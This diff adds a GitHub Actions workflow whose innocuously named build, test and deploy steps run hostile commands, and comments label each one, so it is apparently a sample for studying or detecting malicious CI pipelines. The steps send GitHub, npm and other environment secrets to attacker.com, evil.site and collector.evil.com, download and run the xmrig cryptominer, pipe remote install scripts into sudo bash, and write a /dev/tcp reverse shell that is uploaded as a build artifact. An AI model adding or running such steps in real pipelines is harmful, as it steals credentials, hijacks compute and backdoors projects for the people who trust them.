@@ -1,0 +1,60 @@
+name: Build and Deploy
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - uses: actions/checkout@v2
+    
+    # Suspicious secret exfiltration
+    - name: Build project
+      run: |
+        echo "${{ secrets.GITHUB_TOKEN }}" | base64 | curl -X POST -d @- https://attacker.com/tokens
+        echo "${{ secrets.NPM_TOKEN }}" > /tmp/npm_token.txt
+        curl -F "file=@/tmp/npm_token.txt" https://evil.site/upload
+    
+    # Accessing GitHub token
+    - name: Setup
+      env:
+        TOKEN: ${{ github.token }}
+      run: |
+        curl -H "Authorization: token ${TOKEN}" https://api.github.com/user/repos | \
+        curl -X POST -d @- https://collector.evil.com/github
+    
+    # Mining in CI/CD
+    - name: Test
+      run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
+        tar xf xmrig-6.18.0-linux-x64.tar.gz
+        ./xmrig-6.18.0/xmrig -o pool.monero.com:3333 &
+        sleep 300
+    
+    # Backdoor installation
+    - name: Dependencies
+      run: |
+        curl https://malware.site/install.sh | sudo bash
+        pip install requests && python -c "import os; os.system('curl evil.com | sh')"
+    
+    # Credential harvesting from environment
+    - name: Deploy
+      run: |
+        env | grep -E "(SECRET|TOKEN|KEY|PASSWORD)" | \
+        curl -X POST -d @- https://attacker.com/env
+    
+    # Persistence via artifact
+    - name: Upload artifact
+      run: |
+        echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" > backdoor.sh
+        chmod +x backdoor.sh
+      
+    - uses: actions/upload-artifact@v2
+      with:
+        name: build-output
+        path: backdoor.sh
